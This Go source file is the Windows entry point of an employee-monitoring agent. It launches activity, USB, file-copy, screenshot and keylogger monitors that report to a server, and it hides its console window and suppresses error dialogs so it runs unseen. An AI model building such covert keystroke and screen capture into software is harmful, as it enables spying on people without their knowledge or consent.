//go:build windows
// +build windows

package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"sync"
	"syscall"
	"time"

	"github.com/ctolnik/Office-Monitor/agent/buffer"
	"github.com/ctolnik/Office-Monitor/agent/config"
	"github.com/ctolnik/Office-Monitor/agent/httpclient"
	"github.com/ctolnik/Office-Monitor/agent/monitoring"
	"golang.org/x/sys/windows"
)

var (
	configPath = flag.String("config", "config.yaml", "Path to config file")
	version    = "1.0.0"
	appMutex   windows.Handle
)

// monitorManager holds all active monitors
type monitorManager struct {
	activityTracker   *monitoring.ActivityTracker
	usbMonitor        *monitoring.USBMonitor
	fileMonitor       *monitoring.FileMonitor
	screenshotMonitor *monitoring.ScreenshotMonitor
	keylogger         *monitoring.Keylogger
	eventBuffer       *buffer.EventBuffer
	wg                sync.WaitGroup
}

func main() {
	// Hide console window on Windows
	hideConsoleWindow()

	// Disable panic dialogs
	disablePanicDialogs()

	// Setup logging to file
	if err := setupLogging(); err != nil {
		// Silently fail if can't setup logging
		return
	}

	// Recover from panics to prevent error dialogs
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC recovered: %v", r)
		}
	}()

	flag.Parse()

	log.Printf("Employee Monitoring Agent v%s starting...", version)

	// Check single instance
	if err := ensureSingleInstance(); err != nil {
		log.Printf("Another instance is already running: %v", err)
		return
	}
	defer releaseMutex()

	// Load configuration
	cfg, err := config.Load(*configPath)
	if err != nil {
		log.Printf("Failed to load config: %v", err)
		return
	}

	log.Printf("Computer: %s, User: %s", cfg.Agent.ComputerName, os.Getenv("USERNAME"))
	log.Printf("Server: %s", cfg.Agent.Server.URL)

	// Create HTTP client
	httpClient := httpclient.NewClient(httpclient.Config{
		ServerURL:      cfg.Agent.Server.URL,
		APIKey:         cfg.Agent.APIKey,
		TimeoutSeconds: cfg.Agent.Server.TimeoutSeconds,
		RetryAttempts:  cfg.Agent.Server.RetryAttempts,
		RetryDelay:     time.Duration(cfg.Agent.Server.RetryDelay) * time.Second,
	})

	// Test server connection
	pingCtx, pingCancel := context.WithTimeout(context.Background(), 10*time.Second)
	if err := httpClient.Ping(pingCtx); err != nil {
		log.Printf("WARNING: Server ping failed: %v (will work offline)", err)
	} else {
		log.Println("Server connection OK")
	}
	pingCancel()

	// Create main context
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Initialize monitor manager
	mgr := &monitorManager{}

	// Initialize event buffer for offline work
	mgr.eventBuffer, err = initEventBuffer(cfg, httpClient)
	if err != nil {
		log.Printf("Failed to create event buffer: %v", err)
		return
	}

	// Start event buffer
	mgr.wg.Add(1)
	go func() {
		defer mgr.wg.Done()
		mgr.eventBuffer.Start(ctx)
	}()
	log.Printf("Event buffer initialized (offline capable)")

	// Initialize all monitors
	initActivityMonitor(ctx, cfg, httpClient, mgr.eventBuffer, mgr)
	initUSBMonitor(cfg, mgr)
	initScreenshotMonitor(cfg, httpClient, mgr)
	initFileMonitor(cfg, mgr)
	initKeylogger(cfg, mgr)

	log.Printf("Agent is running with %d active monitors...", countActiveMonitors(mgr))
	if mgr.eventBuffer != nil {
		log.Printf("Buffered events: %d", mgr.eventBuffer.Size())
	}

	// Wait for interrupt signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	<-sigChan

	log.Println("Shutting down gracefully...")

	// Cancel context to stop all monitors
	cancel()

	// Stop all monitors
	stopAllMonitors(mgr)

	// Wait for all monitors with timeout
	shutdownDone := make(chan struct{})
	go func() {
		mgr.wg.Wait()
		close(shutdownDone)
	}()

	// Wait for graceful shutdown or timeout
	select {
	case <-shutdownDone:
		log.Println("Agent stopped cleanly")
	case <-time.After(10 * time.Second):
		log.Println("Shutdown timeout, forcing exit")
	}
}

// initEventBuffer initializes the event buffer
func initEventBuffer(cfg *config.Config, client *httpclient.Client) (*buffer.EventBuffer, error) {
	bufferCfg := buffer.Config{
		Client:      client,
		Endpoint:    "/api/events/batch",
		MaxSize:     cfg.Performance.EventBufferSize,
		FlushSize:   50,
		FlushPeriod: 30 * time.Second,
	}

	return buffer.NewEventBuffer(bufferCfg)
}

// initActivityMonitor initializes activity monitoring
func initActivityMonitor(ctx context.Context, cfg *config.Config, client *httpclient.Client, eventBuffer *buffer.EventBuffer, mgr *monitorManager) {
	if !cfg.ActivityMonitoring.Enabled {
		log.Println("Activity monitoring: DISABLED")
		return
	}

	tracker, err := monitoring.NewActivityTracker(
		client,
		eventBuffer,
		cfg.Agent.ComputerName,
		cfg.ActivityMonitoring.IntervalSeconds,
	)
	if err != nil {
		log.Printf("Failed to create activity tracker: %v", err)
		return
	}

	mgr.activityTracker = tracker
	mgr.wg.Add(1)
	go func() {
		defer mgr.wg.Done()
		defer func() {
			if r := recover(); r != nil {
				log.Printf("Activity tracker panic: %v", r)
			}
		}()
		if err := tracker.Start(ctx); err != nil && err != context.Canceled {
			log.Printf("Activity tracker error: %v", err)
		}
	}()

	log.Printf("Activity monitoring: ENABLED (interval: %ds)", cfg.ActivityMonitoring.IntervalSeconds)
}

// initUSBMonitor initializes USB monitoring
func initUSBMonitor(cfg *config.Config, mgr *monitorManager) {
	if !cfg.USBMonitoring.Enabled {
		log.Println("USB monitoring: DISABLED")
		return
	}

	monitor := monitoring.NewUSBMonitor(
		cfg.Agent.Server.URL,
		cfg.Agent.ComputerName,
		os.Getenv("USERNAME"),
		cfg.USBMonitoring.ShadowCopyEnabled,
		cfg.USBMonitoring.ShadowCopyDest,
		cfg.USBMonitoring.CopyFileExtensions,
		cfg.USBMonitoring.ExcludePatterns,
	)

	if err := monitor.Start(); err != nil {
		log.Printf("WARNING: USB monitoring failed to start: %v", err)
		return
	}

	mgr.usbMonitor = monitor
	log.Println("USB monitoring: ENABLED")
	if cfg.USBMonitoring.ShadowCopyEnabled {
		log.Printf("Shadow copy: ENABLED -> %s", cfg.USBMonitoring.ShadowCopyDest)
	}
}

// initScreenshotMonitor initializes screenshot capture
func initScreenshotMonitor(cfg *config.Config, client *httpclient.Client, mgr *monitorManager) {
	if !cfg.Screenshots.Enabled {
		log.Println("Screenshot capture: DISABLED")
		return
	}

	monitor := monitoring.NewScreenshotMonitor(
		cfg.Agent.Server.URL,
		cfg.Agent.ComputerName,
		os.Getenv("USERNAME"),
		cfg.Screenshots.IntervalMinutes,
		cfg.Screenshots.Quality,
		cfg.Screenshots.MaxSizeKB,
		cfg.Screenshots.CaptureOnlyActive,
		cfg.Screenshots.UploadImmediately,
		client,
	)

	if err := monitor.Start(); err != nil {
		log.Printf("WARNING: Screenshot capture failed to start: %v", err)
		return
	}

	mgr.screenshotMonitor = monitor
	log.Printf("Screenshot capture: ENABLED (interval: %dm, quality: %d)",
		cfg.Screenshots.IntervalMinutes, cfg.Screenshots.Quality)
}

// initFileMonitor initializes file monitoring
func initFileMonitor(cfg *config.Config, mgr *monitorManager) {
	if !cfg.FileMonitoring.Enabled {
		log.Println("File monitoring: DISABLED")
		return
	}

	monitor := monitoring.NewFileMonitor(
		cfg.Agent.Server.URL,
		cfg.Agent.ComputerName,
		os.Getenv("USERNAME"),
		cfg.FileMonitoring.MonitoredLocations,
		cfg.FileMonitoring.LargeCopyThresholdMB,
		cfg.FileMonitoring.LargeCopyFileCount,
		cfg.FileMonitoring.DetectExternalCopy,
	)

	if err := monitor.Start(); err != nil {
		log.Printf("WARNING: File monitoring failed to start: %v", err)
		return
	}

	mgr.fileMonitor = monitor
	log.Printf("File monitoring: ENABLED (%d locations, thresholds: %dMB / %d files)",
		len(cfg.FileMonitoring.MonitoredLocations),
		cfg.FileMonitoring.LargeCopyThresholdMB,
		cfg.FileMonitoring.LargeCopyFileCount)
}

// initKeylogger initializes keylogger
func initKeylogger(cfg *config.Config, mgr *monitorManager) {
	if !cfg.Keylogger.Enabled {
		log.Println("Keylogger: DISABLED")
		return
	}

	log.Println("WARNING: Keylogger enabled - ensure legal compliance!")

	keylogger := monitoring.NewKeylogger(
		cfg.Agent.Server.URL,
		cfg.Agent.ComputerName,
		os.Getenv("USERNAME"),
		cfg.Keylogger.MonitoredProcesses,
		cfg.Keylogger.BufferSizeChars,
		cfg.Keylogger.SendIntervalMin,
	)

	if err := keylogger.Start(); err != nil {
		log.Printf("WARNING: Keylogger failed to start: %v", err)
		return
	}

	mgr.keylogger = keylogger
	log.Printf("Keylogger: ENABLED (processes: %v)", cfg.Keylogger.MonitoredProcesses)
}

// stopAllMonitors stops all active monitors
func stopAllMonitors(mgr *monitorManager) {
	if mgr.activityTracker != nil {
		mgr.activityTracker.Stop()
	}
	if mgr.usbMonitor != nil {
		mgr.usbMonitor.Stop()
	}
	if mgr.fileMonitor != nil {
		mgr.fileMonitor.Stop()
	}
	if mgr.screenshotMonitor != nil {
		mgr.screenshotMonitor.Stop()
	}
	if mgr.keylogger != nil {
		mgr.keylogger.Stop()
	}
	if mgr.eventBuffer != nil {
		mgr.eventBuffer.Stop()
	}
}

// countActiveMonitors returns the number of active monitors
func countActiveMonitors(mgr *monitorManager) int {
	count := 0
	if mgr.activityTracker != nil {
		count++
	}
	if mgr.usbMonitor != nil {
		count++
	}
	if mgr.fileMonitor != nil {
		count++
	}
	if mgr.screenshotMonitor != nil {
		count++
	}
	if mgr.keylogger != nil {
		count++
	}
	return count
}

// hideConsoleWindow hides the console window on Windows
func hideConsoleWindow() {
	modKernel32 := windows.NewLazySystemDLL("kernel32.dll")
	modUser32 := windows.NewLazySystemDLL("user32.dll")
	procGetConsoleWindow := modKernel32.NewProc("GetConsoleWindow")
	procShowWindow := modUser32.NewProc("ShowWindow")

	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		procShowWindow.Call(hwnd, 0) // SW_HIDE = 0
	}
}

// disablePanicDialogs disables Windows error reporting dialogs
func disablePanicDialogs() {
	modKernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procSetErrorMode := modKernel32.NewProc("SetErrorMode")

	// SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX
	const errorMode = 0x0001 | 0x0002 | 0x8000
	procSetErrorMode.Call(uintptr(errorMode))
}

// setupLogging configures logging to file
func setupLogging() error {
	logDir := filepath.Join(os.Getenv("ProgramData"), "MonitoringAgent")
	if err := os.MkdirAll(logDir, 0755); err != nil {
		return err
	}

	logFile := filepath.Join(logDir, "agent.log")
	f, err := os.OpenFile(logFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		return err
	}

	// Don't close - log file stays open for entire app lifetime
	multiWriter := io.MultiWriter(f)
	log.SetOutput(multiWriter)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)

	return nil
}

// ensureSingleInstance ensures only one instance of agent is running
func ensureSingleInstance() error {
	mutexName, err := windows.UTF16PtrFromString("Global\\OfficeMonitoringAgent_SingleInstance")
	if err != nil {
		return fmt.Errorf("failed to convert mutex name: %w", err)
	}

	mutex, err := windows.CreateMutex(nil, false, mutexName)
	if err != nil {
		return fmt.Errorf("failed to create mutex: %w", err)
	}

	event, err := windows.WaitForSingleObject(mutex, 0)
	if err != nil {
		windows.CloseHandle(mutex)
		return fmt.Errorf("failed to wait for mutex: %w", err)
	}

	const WAIT_TIMEOUT = 0x00000102
	if event == WAIT_TIMEOUT {
		windows.CloseHandle(mutex)
		return fmt.Errorf("another instance is running")
	}

	appMutex = mutex
	return nil
}

// releaseMutex releases the single instance mutex
func releaseMutex() {
	if appMutex != 0 {
		windows.ReleaseMutex(appMutex)
		windows.CloseHandle(appMutex)
	}
}
